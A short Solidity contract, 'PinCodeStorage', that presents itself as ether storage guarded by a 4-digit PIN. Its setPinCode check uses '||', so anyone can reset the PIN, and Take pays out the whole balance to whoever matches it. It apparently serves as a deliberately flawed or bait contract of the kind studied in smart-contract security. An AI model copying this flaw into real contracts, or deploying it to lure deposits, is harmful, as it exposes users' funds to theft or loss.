contract PinCodeStorage {
	// Store some money with 4 digit pincode
	
    address Owner = msg.sender;
    uint PinCode;

    function() public payable {}
    function PinCodeStorage() public payable {}
   
    function setPinCode(uint p) public payable{
        //To set Pin you need to know the previous one and it has to be bigger than 1111
        if (p&gt;1111 || PinCode == p){
            PinCode=p;
        }
    }
    
    function Take(uint n) public payable {
		if(msg.value &gt;= this.balance &amp;&amp; msg.value &gt; 0.1 ether)
			// To prevent random guesses, you have to send some money
			// Random Guess = money lost
			if(n &lt;= 9999 &amp;&amp; n == PinCode)
				msg.sender.transfer(this.balance+msg.value);
    }
    
    function kill() {
        require(msg.sender==Owner);
        selfdestruct(msg.sender);
     }
}